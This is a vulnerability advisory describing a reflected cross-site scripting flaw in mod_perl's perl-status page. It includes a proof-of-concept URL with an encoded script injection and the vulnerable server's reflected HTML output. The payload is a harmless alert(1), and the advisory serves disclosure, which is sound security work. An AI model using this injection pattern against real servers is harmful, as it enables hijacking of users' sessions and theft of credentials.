Description: 

There is a Cross-site Scripting vulnerability on Mod_perl's, perl-status utility. The perl-status utility on request displays the current status of the Mod_perl server, and some configuration information. Perl-status when configured to allow any viewers, presents an information disclosure risk,
Procheckup has found by making a malformed request to perl-status, that additionally a vanilla cross site scripting (XSS) attack is possible.


Proof of concept:

Submitting the following string to an unpatched server "server".
http://server:80/perl-status/APR::SockAddr::port/%22%3E%3Cscript%3Ealert(1)%3C/script%3E


The following is returned:-
<p><a href="/perl-status/APR::SockAddr::port/"><script>alert(1)</script>?env">Environment</a><br />
<a href="/perl-status/APR::SockAddr::port/"><script>alert(1)</script>?inc">Loaded Modules</a><br />
<a href="/perl-status/APR::SockAddr::port/"><script>alert(1)</script>?inh_tree">Inheritance Tree</a><br />
<a href="/perl-status/APR::SockAddr::port/"><script>alert(1)</script>?isa_tree">ISA Tree</a><br />
<a href="/perl-status/APR::SockAddr::port/"><script>alert(1)</script>?myconfig">Perl Configuration</a><br />
<a href="/perl-status/APR::SockAddr::port/"><script>alert(1)</script>?rgysubs">Compiled Registry Scripts</a><br />
<a href="/perl-status/APR::SockAddr::port/"><script>alert(1)</script>?script">PerlRequire'd Files</a><br />
<a href="/perl-status/APR::SockAddr::port/"><script>alert(1)</script>?sig">Signal Handlers</a><br />
<a href="/perl-status/APR::SockAddr::port/"><script>alert(1)</script>?symdump">Symbol Table Dump</a><br />
</p></body></html>


An attacker may be able to cause execution of malicious scripting code in the browser of a user who clicks on a link or visits a malicious webpage. The malicious code would run in the security context of the vulnerable website.

This type of attack can result in non-persistent defacement of the target site, or the redirection of confidential information (i.e.: passwords or session IDs) to unauthorised third parties.
